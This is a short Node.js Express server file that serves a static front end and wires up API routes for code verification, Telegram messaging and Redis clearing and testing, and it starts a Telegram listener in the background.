import express from "express";
import path from "path";
import { fileURLToPath } from "url";

// Setup directory references
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json());
app.use(express.static(path.join(__dirname, "../public")));

// Serve index.html at root
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "../public/index.html"));
});

// API routes
import verifyCodeRoute from "./verify-code.js";
import sendTelegramRoute from "./send-telegram.js";
import clearRedisRoute from "./clear-redis.js";
import testRedisRoute from "./test-redis.js"; // ✅ Added test-redis route

app.use("/api/verify-code", verifyCodeRoute);
app.use("/api/send-telegram", sendTelegramRoute);
app.use("/api/clear-redis", clearRedisRoute);
app.use("/api/test-redis", testRedisRoute);   // ✅ Registered test-redis route

// ✅ Start Telegram code listener (runs in background)
import "./telegram-listener.js";

// Start server
app.listen(PORT, () => {
  console.log(`✅ Server running on port ${PORT}`);
});
